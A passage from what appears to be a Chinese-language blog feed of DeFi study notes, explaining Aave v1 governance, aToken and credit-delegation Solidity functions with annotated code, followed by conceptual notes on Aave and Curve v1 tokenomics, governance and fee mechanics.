title="取消投票"></a>取消投票</h3><p>这个方法用于防止重复投票攻击，任何人发现了有人尝试重复投票攻击，可以进行质疑：当投票者当前的投票资产余额小于投票时资产的余额时，投票被视为无效，因为他可能拿着这笔钱干其他事情，比如转给另外一个人，然后继续投票；或者拿这个钱干其他事情。</p><p>举个例子：Alice 的余额为 100 LEND，对提案 1 进行投票，并在“验证”阶段结束之前将 50 LEND 发送到交易所。由于她当前的余额少于投票时的余额，她的投票将无效。</p><ul><li>只有在提案有效的时候才可以质疑</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  function challengeVoters(uint256 _proposalId, address[] calldata _voters) external &#123;</span><br><span class="line"></span><br><span class="line">      Proposal storage _proposal = proposals[_proposalId];</span><br><span class="line">      // 只有在提案有效的时候才可以质疑</span><br><span class="line">      require(_proposal.proposalStatus == ProposalStatus.Validating, &quot;VALIDATING_STATUS_REQUIRED&quot;);</span><br><span class="line"></span><br><span class="line">      for (uint256 i = 0; i &lt; _voters.length; i++) &#123;</span><br><span class="line">          address _voterAddress = _voters[i];</span><br><span class="line">          Voter memory _voter = _proposal.voters[_voterAddress];</span><br><span class="line">          uint256 _voterAssetBalance = _voter.asset.balanceOf(_voterAddress);</span><br><span class="line">          // 取消某个恶意用户的投票资格</span><br><span class="line">          if (_voterAssetBalance &lt; _voter.balance) &#123;</span><br><span class="line">              internalCancelVote(_proposalId, _voterAddress);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">// 取消某个恶意用户的投票资格后，重新遍历投票数，如果没达到投票阈值，则重新</span><br><span class="line">// 回到投票期间（前提是投票时间尚未结束）</span><br><span class="line">      if (_proposal.movesToVoting &lt; _proposal.maxMovesToVotingAllowed &amp;&amp;</span><br><span class="line">          _proposal.votes[getLeadingChoice(_proposalId)] &lt; _proposal.threshold) &#123;</span><br><span class="line">          internalMoveToVoting(_proposalId);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="view方法-2"><a href="#view方法-2" class="headerlink" title="view方法"></a>view方法</h3><ul><li><p><code>getLimitBlockOfProposal()</code>：查看某个提案到达哪个取款之后是无效的</p></li><li><p>getLeadingChoice()：查看某个提案哪个票多，赞成？弃权？反对？</p></li><li><p><code>getProposalBasicData()</code>：获取某个提案的详细信息</p></li><li><code>getVoterData()</code>：获取某人对某个提案的投票情况</li><li><code>getVotesData()</code>：获取给定提案 ID 的投票数据，即每个选项的累积投票数。例如，<code>[1, 2, 3]</code>翻译为：1人齐全，2人同意，3人反对</li></ul><h2 id="aToken"><a href="#aToken" class="headerlink" title="aToken"></a>aToken</h2><ul><li>aToken是生息衍生代币，deposit的时候被铸造，提现的时候被销毁。</li><li>aTokens的价值与相应存入资产的价值以1:1的比例挂钩，可以安全地存储、转移或交易。</li><li>AAVE收取的手续费将会给到aToken的持有者，aToken会不断增值</li></ul><h3 id="取款-2"><a href="#取款-2" class="headerlink" title="取款"></a>取款</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">function redeem(uint256 _amount) external &#123;</span><br><span class="line"></span><br><span class="line">    require(_amount &gt; 0, &quot;Amount to redeem needs to be &gt; 0&quot;);</span><br><span class="line"></span><br><span class="line">    // 计算用户的余额</span><br><span class="line">    (,</span><br><span class="line">    uint256 currentBalance,</span><br><span class="line">    uint256 balanceIncrease,</span><br><span class="line">    uint256 index) = cumulateBalanceInternal(msg.sender);</span><br><span class="line"></span><br><span class="line">    uint256 amountToRedeem = _amount;</span><br><span class="line"></span><br><span class="line">    // 如果取出的金额是-1，则代表全部资产取出</span><br><span class="line">    if(_amount == UINT_MAX_VALUE)&#123;</span><br><span class="line">        amountToRedeem = currentBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    require(amountToRedeem &lt;= currentBalance, &quot;User cannot redeem more than the available balance&quot;);</span><br><span class="line"></span><br><span class="line">    // 查看用户是否被允许取款</span><br><span class="line">    require(isTransferAllowed(msg.sender, amountToRedeem), &quot;Transfer cannot be allowed.&quot;);</span><br><span class="line"></span><br><span class="line">    // 如果用户将他的利润给其他人，我们计算利息。如果没重定向给别人，则啥也不做</span><br><span class="line">    // mapping (address =&gt; address) private interestRedirectionAddresses; 用来重定向利润给谁</span><br><span class="line">    updateRedirectedBalanceOfRedirectionAddressInternal(msg.sender, balanceIncrease, amountToRedeem);</span><br><span class="line"></span><br><span class="line">    // 烧掉aToken</span><br><span class="line">    _burn(msg.sender, amountToRedeem);</span><br><span class="line"></span><br><span class="line">    bool userIndexReset = false;</span><br><span class="line">    // 如果取出之后，用户的资产归零，则设置用户的信息</span><br><span class="line">    if(currentBalance.sub(amountToRedeem) == 0)&#123;</span><br><span class="line">        userIndexReset = resetDataOnZeroBalanceInternal(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 拿回标的资产</span><br><span class="line">    pool.redeemUnderlying(</span><br><span class="line">        underlyingAssetAddress,</span><br><span class="line">        msg.sender,</span><br><span class="line">        amountToRedeem,</span><br><span class="line">        currentBalance.sub(amountToRedeem)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    emit Redeem(msg.sender, amountToRedeem, balanceIncrease, userIndexReset ? 0 : index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="转账"><a href="#转账" class="headerlink" title="转账"></a>转账</h3><p>用于将代币转移<code>msg.sender</code>到指定的<code>recipient</code>。</p><p>注意，如果要转账的aToken被用作抵押品，则调用会失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address recipient, uint256 amount) public</span><br><span class="line">function transferFrom(address from, address to, uint256 amount) public</span><br></pre></td></tr></table></figure><h3 id="利息重定向"><a href="#利息重定向" class="headerlink" title="利息重定向"></a>利息重定向</h3><p>将aToken生成的利息给谁，<code>_from</code>不可以是 <code>_to</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function redirectInterestStreamInternal(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to</span><br><span class="line">) internal</span><br></pre></td></tr></table></figure><p>允许_to执行利息重定向。此方法允许第三方代表存款人设置利息流重定向。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function allowInterestRedirectionTo(address _to)</span><br></pre></td></tr></table></figure><p>_from授权给msg.sender了，它可以进一步重定向利润给其他人</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function redirectInterestStreamOf(address _from, address _to) external</span><br></pre></td></tr></table></figure><h3 id="view方法-3"><a href="#view方法-3" class="headerlink" title="view方法"></a>view方法</h3><ul><li><code>isTransferAllowed()</code>：用于查看如果调用transfer或者取款函数会不会失败，因为这两个操作会影响健康因子</li></ul><h2 id="信用委托"><a href="#信用委托" class="headerlink" title="信用委托"></a>信用委托</h2><p>使用OpenLaw实现，AAVE并没有部署相关的合约，<a href="https://etherscan.io/address/0xf0988322b8392245d6232e520bf3cdf912b043c4#code">可以在区块链浏览器找到完整代码</a></p><h3 id="部署Vault"><a href="#部署Vault" class="headerlink" title="部署Vault"></a>部署Vault</h3><p>部署一个<code>_asset</code>可供借用的保管库，返回新部署的 AaveCollateralVault 的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function deployVault(address _asset) external returns (address) &#123;</span><br><span class="line">        address vault = address(new AaveCollateralVault());</span><br><span class="line">        AaveCollateralVault(vault).setBorrow(_asset);</span><br><span class="line">        // Mark address as vault</span><br><span class="line">        _vaults[vault] = msg.sender;</span><br><span class="line">        </span><br><span class="line">        // Set vault owner</span><br><span class="line">        _ownedVaults[msg.sender].push(vault);</span><br><span class="line">        emit DeployVault(vault, msg.sender, _asset);</span><br><span class="line">        return vault;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="利率模型"><a href="#利率模型" class="headerlink" title="利率模型"></a>利率模型</h3><p>在稳定利率或可变利率之间更改利率模型。</p><p>利率模型：<code>1</code>是稳定利率，<code>2</code>是可变利率。默认为<code>2</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function setModel(uint _model) external onlyOwner &#123;</span><br><span class="line">    model = _model;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="增加限制"><a href="#增加限制" class="headerlink" title="增加限制"></a>增加限制</h3><p>增加对spender的限制</p><ul><li>vault：已部署的AaveCollateralVault地址。</li><li>spender：借款人</li><li>addedValue：<code>spender</code>能够借入的最大金额（以资产的基本单位表示，例如WBTC有6位小数，USDC有8位小数，ETH有18位小数）。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function increaseLimit(address vault, address spender, uint addedValue) external &#123;</span><br><span class="line">    require(isVaultOwner(address(vault), msg.sender), &quot;!owner&quot;);</span><br><span class="line">    if (!_borrowerContains[vault][spender]) &#123;</span><br><span class="line">        _borrowerContains[vault][spender] = true;</span><br><span class="line">        _borrowers[vault].push(spender);</span><br><span class="line">        _borrowerVaults[spender].push(vault);</span><br><span class="line">    &#125;</span><br><span class="line">    uint amount = _limits[vault][spender].add(addedValue);</span><br><span class="line">    _approve(vault, spender, amount);</span><br><span class="line">    emit IncreaseLimit(vault, msg.sender, spender, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="启动委托信贷"><a href="#启动委托信贷" class="headerlink" title="启动委托信贷"></a>启动委托信贷</h3><p>将 aToken 抵押品存入<code>AaveCollateralVault</code>以启用委托信贷。</p><ul><li>vault：已部署的<code>AaveCollateralVault</code>地址。</li><li>aToken：aToken地址</li><li>amount：数额</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function deposit(AaveCollateralVault vault, address aToken, uint amount) external &#123;</span><br><span class="line">    require(isVault(address(vault)), &quot;!vault&quot;);</span><br><span class="line">    IERC20(aToken).safeTransferFrom(msg.sender, address(vault), amount);</span><br><span class="line">    address underlying = AaveToken(aToken).underlyingAssetAddress();</span><br><span class="line">    if (vault.isReserve(underlying) == false) &#123;</span><br><span class="line">        vault.activate(underlying);</span><br><span class="line">    &#125;</span><br><span class="line">    emit Deposit(address(vault), msg.sender, aToken, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="借款-1"><a href="#借款-1" class="headerlink" title="借款"></a>借款</h3><p>只有低于最大可借金额的<code>spender</code>才可以调用该方法借入金额</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function borrow(AaveCollateralVault vault, address reserve, uint amount) external &#123;</span><br><span class="line">    require(isVault(address(vault)), &quot;!vault&quot;);</span><br><span class="line">    uint _borrow = amount;</span><br><span class="line">    if (vault.asset() == address(0)) &#123;</span><br><span class="line">        _borrow = getReservePriceUSD(reserve).mul(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    _approve(address(vault), msg.sender, _limits[address(vault)][msg.sender].sub(_borrow, &quot;borrow amount exceeds allowance&quot;));</span><br><span class="line">    vault.borrow(reserve, amount, msg.sender);</span><br><span class="line">    emit Borrow(address(vault), msg.sender, reserve, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="还款-1"><a href="#还款-1" class="headerlink" title="还款"></a>还款</h3><p>在调用之前，调用者必须approve授权给AaveCollateralVaultProxy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function repay(AaveCollateralVault vault, address reserve, uint amount) external &#123;</span><br><span class="line">    require(isVault(address(vault)), &quot;!vault&quot;);</span><br><span class="line">    IERC20(reserve).safeTransferFrom(msg.sender, address(vault), amount);</span><br><span class="line">    vault.repay(reserve, amount);</span><br><span class="line">    emit Repay(address(vault), msg.sender, reserve, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="取款-3"><a href="#取款-3" class="headerlink" title="取款"></a>取款</h3><p>信用委托人可以在适当的时候提取 aToken 抵押品</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(AaveCollateralVault vault, address aToken, uint amount) external &#123;</span><br><span class="line">    require(isVaultOwner(address(vault), msg.sender), &quot;!owner&quot;);</span><br><span class="line">    vault.withdraw(aToken, amount, msg.sender);</span><br><span class="line">    emit Withdraw(address(vault), msg.sender, aToken, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="价格预言机"><a href="#价格预言机" class="headerlink" title="价格预言机"></a>价格预言机</h2><p>见文档</p>]]></content>
      
      
      <categories>
          
          <category> 12.DeFi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.AAVE_v1_theory</title>
      <link href="/2024/04/14/12.DeFi/04.AAVE_v1_theory/"/>
      <url>/2024/04/14/12.DeFi/04.AAVE_v1_theory/</url>
      
        <content type="html"><![CDATA[<h1 id="AAVE-theory"><a href="#AAVE-theory" class="headerlink" title="AAVE_theory"></a>AAVE_theory</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li>定义：Aave 是一种去中心化的非托管流动性协议，用户可以作为存款人或借款人参与。储户向市场提供流动性以赚取手续费，而借款人则能够以超额抵押或无抵押的方式借款。</li></ul><p>架构</p><p><img src="/2024/04/14/12.DeFi/04.AAVE_v1_theory/image-20230804192740178.png" alt="image-20230804192740178"></p><h2 id="DAO"><a href="#DAO" class="headerlink" title="DAO"></a>DAO</h2><h3 id="治理代币"><a href="#治理代币" class="headerlink" title="治理代币"></a>治理代币</h3><p>AAVE的治理代币叫做：AAVE Token，总共发行了 16,000,000 个 AAVE。13,000,000 AAVE 分配给用户，其余 3,000,000 AAVE 分配给生态系统储备。</p><div class="table-container"><table><thead><tr><th>角色</th><th>平均持币数量</th><th>比例</th></tr></thead><tbody><tr><td>项目方</td><td>416</td><td>26%</td></tr><tr><td>散户</td><td>520</td><td>33%</td></tr><tr><td>交易所</td><td>264</td><td>17%</td></tr><tr><td>合约+挖矿奖励</td><td>400</td><td>25%</td></tr></tbody></table></div><ul><li>作用：投票、治理、质押、分红</li></ul><p>从概述的架构图中，我们可以看出AAVE Token最重要的两个作用是：参与 AAVE 协议的治理、在安全模块中进行质押获取AAVE的协议利润分红。</p><h3 id="提案"><a href="#提案" class="headerlink" title="提案"></a>提案</h3><ul><li><p>要创建提案，提案人将首先通过在社区论坛上提交 Aave 评论请求 (ARC) 来衡量 Aave 社区的态度。下一阶段需要根据最初在 Aave 社区论坛上提交的 ARC 反馈，创建 Aave 改进提案 (AIP)。</p><ol><li>任何人都可以在治理论坛创建ARC提案，超过8万票算创建成功</li><li>提案创建成功之后至少需要32w的参与票才算有效，并且有超过50.25%以上的赞同票，提案才算通过。</li><li>ARC经过社区投票通过后，提交Aave Improvement Proposal (AIP提案)（ps：如果创建人自己拥有超过8w枚代币，就可以直接提交AIP提案）</li><li>一旦AIP被编写，需要提交github</li><li>AIP会列入官方治理模块，进入投票流程（允许用户使用冷钱包进行投票）</li><li>通过投票的AIP开始自动执行和实现</li></ol></li></ul><p><img src="/2024/04/14/12.DeFi/04.AAVE_v1_theory/image-20230804194749749.png" alt="image-20230804194749749"></p><ul><li>提案类型<ul><li>短执行：短执行通常为协议参数的变更，资产列表的变更等</li><li>长执行：长执行提案涉及到核心代码库的变更，二者之间提案所需要的时间以及票数等都不同</li></ul></li></ul><div class="table-container"><table><thead><tr><th></th><th>短执行</th><th>长执行</th></tr></thead><tbody><tr><td>描述</td><td>协议的小变动：参数更改、资产列表等</td><td>变更治理等，协议核心代码库</td></tr><tr><td>提案门槛</td><td>5%（AAVE 80K）</td><td>2%（AAVE 320K）</td></tr><tr><td>延迟时间</td><td>1day</td><td>7days</td></tr><tr><td>投票权限</td><td>3days</td><td>10days</td></tr><tr><td>投票法定人数</td><td>2%（AAVE320K）</td><td>20%（AAVE 3.2m）</td></tr><tr><td>投票差</td><td>5%（AAVE 80K）</td><td>15%（AAVE 2.4m）</td></tr><tr><td>宽限期</td><td>5days</td><td>5days</td></tr></tbody></table></div><h2 id="清算"><a href="#清算" class="headerlink" title="清算"></a>清算</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>贷款价值 LTV ：代表了通过特定抵押品可以借入的最大资产比率，例如LTV=80%时，每价值 1ETH 的抵押品只能借出价值 0.8ETH 的资产</li><li>AAVE协议的智能合约本身并不能自动完成清算的操作，所以 AAVE 的清算程序是需要有第三方来完成的，清算人可以获得额外的钱。虽然任何人都可以调用清算合约来充当清算人的角色，但目前清算人的门槛极高，通常由专业的清算机器人来执行且需要庞大的资金量，一般人基本无法参与</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><img src="/2024/04/14/12.DeFi/04.AAVE_v1_theory/image-20230804192054970.png" alt="image-20230804192054970"></p><h2 id="信贷委托机制"><a href="#信贷委托机制" class="headerlink" title="信贷委托机制"></a>信贷委托机制</h2><ul><li>定义：用户存款除了获取利润，还可以将自己的信贷额度委托给其他用户，以此来获取额外的利息收益。也就是说用户获得两笔钱：存款利润+信贷委托手续费。被委托的用户可以花费该贷款人的贷款金额，并且无需任何抵押。</li><li>这种无抵押的模式对于借款人信任的要求很高，存款人需要承担借款人不还钱的风险，所以这种信贷委托通常用于熟人、机构与机构之间的信贷关系。</li></ul><p><img src="/2024/04/14/12.DeFi/04.AAVE_v1_theory/image-20230804191948767.png" alt="image-20230804191948767"></p><h2 id="GHO"><a href="#GHO" class="headerlink" title="GHO"></a>GHO</h2><ul><li><p>定义:  引与美元挂钩、原生去中心化、超额抵押生成的去中心化稳定币GHO</p></li><li><p>特点</p><ul><li>提供持续性收益</li><li>使用用户的存入 AAVE 协议的资产进行超额抵押铸造</li></ul></li></ul><h2 id="aToken"><a href="#aToken" class="headerlink" title="aToken"></a>aToken</h2><ul><li>当资产存入 AAVE 智能合约后用户会收到存入资产的 aToken 版本，如存入 USDT 获得aUSDT，aUSDT的功能是用来计息的，用户在获得利息收入的同时也可以作为抵押品去借入其他资产</li></ul><h2 id="利率模型"><a href="#利率模型" class="headerlink" title="利率模型"></a>利率模型</h2><ul><li><p>当借贷的人越来越多的时候，存款利率、贷款利息就会上升，鼓励人们存款和减少借贷</p></li><li><p>当借贷的人越来越少的时候，存款利率、贷款利息就会下降，鼓励人们借贷</p></li></ul><p>决定这些变化的最关键的一个指标是：资金利用率 U ，即资产流动性池中有多少资金被借出去了</p><h2 id="闪电贷"><a href="#闪电贷" class="headerlink" title="闪电贷"></a>闪电贷</h2><p>V1版本只支持单一资产的闪电贷</p><p>Aave 目前对每笔闪电贷收取固定比例（0.09%） 的费用。</p><h2 id="安全模块"><a href="#安全模块" class="headerlink" title="安全模块"></a>安全模块</h2><ul><li>作用：当 AAVE 出现短缺事件时保护协议免受意外的资金损失，短缺事件通常为：<ul><li>智能合约风险：AAVE智能合约层存在错误、设计缺陷或潜在攻击面的风险。</li><li>清算风险：在AAVE上用作抵押品的资产发生故障的风险；清算人未能及时抓住清算机会，或待偿还本金资产的市场流动性低的风险。</li><li>预言机故障风险：在市场极度低迷和网络拥塞的情况下， 预言机系统无法正确更新价格的风险；预言机系统未正确提交价格，导致不当清算的风险。</li></ul></li></ul><p>安全模块最多动用AAVE总锁定资产的30%进行修复损失，如果还不够修复损失，那么会增发AAVE进行修复</p>]]></content>
      
      
      <categories>
          
          <category> 12.DeFi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.Curve_v1_theory</title>
      <link href="/2024/04/14/12.DeFi/01.Curve_v1_theory/"/>
      <url>/2024/04/14/12.DeFi/01.Curve_v1_theory/</url>
      
        <content type="html"><![CDATA[<h1 id="Curve-v1-theory"><a href="#Curve-v1-theory" class="headerlink" title="Curve_v1_theory"></a>Curve_v1_theory</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>2020年8月创立</li><li>聚焦于稳定币交易的AMM交易所，包括稳定币、映射币、锚定币</li><li>不是使用solidity编写，而是用Vyper</li><li>合约不可升级，非托管（项目方无权访问你的代币）</li></ul><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><blockquote><p>针对当时uniswapV2的缺点：</p><p>​    滑点：交易的预期价格与执行交易的实际价格之间的差额</p><p>​    无常损失：用户向AMM资金池添加流动性后，用户撤出流动性后所得的资产与单纯持有相比会出现一定的损失</p></blockquote><p>curve针对这些缺点，有自己的优点</p><ul><li>低滑点</li><li>低手续费：代币交换费用统一为0.04%，存取款手续费在0%- 0.02%之间</li><li>资金利用率高</li></ul><p>其他特点</p><ul><li>去中心化</li><li>简单，不需要撮合交易</li><li>不需要做市商</li><li>线上预言机</li><li>独立路径（非路径依赖）</li></ul><h2 id="公式算法"><a href="#公式算法" class="headerlink" title="公式算法"></a>公式算法</h2><ul><li>如果使用恒定和算法<ul><li>优点：无滑点；池子中的价值永远是1（这就意味着无法体现两种代币之间的价值关系 ）</li><li>缺点：只适用于稳定币1：1兑换。如果稳定币价格不是1：1了，就会有套利者到池子中掏空代币，使得流动性枯竭。比如USDT：DAI，当DAI价格变成0.9的时候，套利者就会用USDT换取池子中的所有USDT，导致池子中全都是DAI</li></ul></li></ul><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230804155225915.png" alt="image-20230804155225915"></p><p>这个缺点是无法接收的，但也想获得恒定和的优点，因此Curve取其精华去其糟粕，想到了这个优化方案：取蓝色线。它介于恒定乘积与恒定和之间</p><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230804160009683.png" alt="image-20230804160009683"></p><p>公式：池子中有n个代币</p><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230806142333084.png" alt="image-20230806142333084"></p><p>扩增系数A是一个固定的常数，之前由Curve协议设计师选择，现在由CurveDAO选择。A越大，则恒定和的比例越大，图像越像直线</p><p>例子：池子中只有两个代币</p><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230806142405200.png" alt="image-20230806142405200"></p><h2 id="流动性"><a href="#流动性" class="headerlink" title="流动性"></a>流动性</h2><ul><li><p>LP：交易的手续费的一半分给LP，另外一半给veCRV的持有者</p></li><li><p>存入的时候可以获得LPtoken，比如LP-cCurve, LP-yCurve等。将LP-cCurve再次存入相同的池子，可以获得Curve的激励代币CRV，甚至有些池子还会提供某些项目的代币比如synthetix的项目代币snx。因此，用户的操作一般是：向池子stake代币，然后再将得到的LP再次stake。</p></li></ul><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230806145237634.png" alt="image-20230806145237634"></p><ul><li>添加流动性时发生的事情：比如我在yPool存入1000个DAI，那么根据下图，我在池子中的余额将大约是：158.9 DAI、142.4 USDC、582.4 USDT 和 121.6 TUSD</li></ul><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230806154036683.png" alt="image-20230806154036683"></p><h2 id="DAO"><a href="#DAO" class="headerlink" title="DAO"></a>DAO</h2><h3 id="CRV"><a href="#CRV" class="headerlink" title="CRV"></a>CRV</h3><p>提供流动性的时候获得CRV，特点如下：</p><ul><li><p>总量为30.3亿个，流通总量420,000,000 CRV</p><ul><li>62%分配给LP<ul><li>5%分配给CRV代币推出之前的LP，这5%的代币有一年的解锁期</li><li>57%是在CRV代币推出后分配给LP的，这部分将会在未来6年多时间中逐步释放</li></ul></li><li>30%分配给创始团队和投资人〈有2-4年的解锁期)</li><li>3%授予员工(2年的解锁期)</li><li>5%用作为社区储备。</li></ul></li><li><p>每天生成100万个CRV，根据veCRV的投票比例分配在每个池子里。</p></li></ul><p>CRV的释放周期：</p><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230804161028640.png" alt="image-20230804161028640"></p><h3 id="veCRV"><a href="#veCRV" class="headerlink" title="veCRV"></a>veCRV</h3><ul><li>CRV实际上并没有投票、质押的功能，真正做这些事情的是veCRV。veCRV 简单来说就是将 CRV 锁定一段时间，锁定 CRV 的时间越长，收到的 veCRV 就越多。一旦 CRV 持有者投票锁定他们的 veCRV，他们就可以开始对各种 DAO 提案和矿池参数进行投票。</li><li>锁仓时间越长：1week, 1 month, 3 months, 6 months, 1 year, 5 years</li><li><p>所有交易手续费的 50% 将分配给 veCRV 持有者，收取的费用将用于购买 3CRV（Curve 3Pool稳定池【即DAI+USDC+USDT资金池】的LP Token），并将其分发给 veCRV 持有者</p></li><li><p>不能转账，只能通过锁定CRV获得</p></li><li>veCRV的持有者如果同时为协议提供流通性，会根据质押的年期最高获得2.5倍的流动性奖励，进而提高提供流动性的整体收益。如果LP在3pool中提供流动性，则他们最初将获得0.22%的APR，如果锁定$veCRV可将奖励提高到极限2.5倍，即0.55%。（如果我在提供流动性的时候，还持有veCRV）</li></ul><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230804161726252.png" alt="image-20230804161726252"></p><h3 id="3CRV"><a href="#3CRV" class="headerlink" title="3CRV"></a>3CRV</h3><ul><li><p>对所有交易费用征收 50% 的管理费。这些费用被收集并用于购买 3CRV（TriPool 的 LP 代币），然后分发给 veCRV 持有者</p></li><li><p>所有交易手续费的 50% 将分配给 veCRV 持有者，收取的费用将用于购买 3CRV（Curve 3Pool稳定池【即DAI+USDC+USDT资金池】的LP Token），并将其分发给 veCRV 持有者</p></li></ul><h3 id="治理"><a href="#治理" class="headerlink" title="治理"></a>治理</h3><ul><li>每天只会产生100万个CRV，速率固定。交易市场这么多池子，怎么把这100万个CTV分配出去呢？通过投票！而投票需要veCRV。</li></ul><p>比如：某一个池子拥有11%的veCRV，那么这100万个CRV就会分给这个池子的人。因此，更多的veCRV意味着更多的CRV，而更多的CRV锁仓就可以获得更多的veCRV，循环正向激励。用户为了更多的CRV，就会质押更多的代币，增加了池子的流动性，因为用户想获得更多的投票权以此来获得每天释放的100万个CRV，形成了Curve War。</p><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230804162220132.png" alt="image-20230804162220132"></p><p>拥有2500个veCRV的用户可以发起提案，治理流程如下：</p><p><img src="/2024/04/14/12.DeFi/01.Curve_v1_theory/image-20230806150720753.png" alt="image-20230806150720753"></p><h2 id="收益"><a href="#收益" class="headerlink" title="收益"></a>收益</h2><ul><li>交易费用：0.04%手续费给流动性提供者</li><li>存款获得利润</li><li>bonus：Curve希望每一个池子中的代币比例是相同的，比如两个代币一开始是50%：50%，如果出现30%：70%的情况，Curve会奖励给调整30%向50%增加的用户一些钱bonus（无论增加还是减少池子中的代币）。</li><li>为流动性池子提供流动性而得到的额外奖励，比如CRV</li></ul><h2 id="滑点"><a 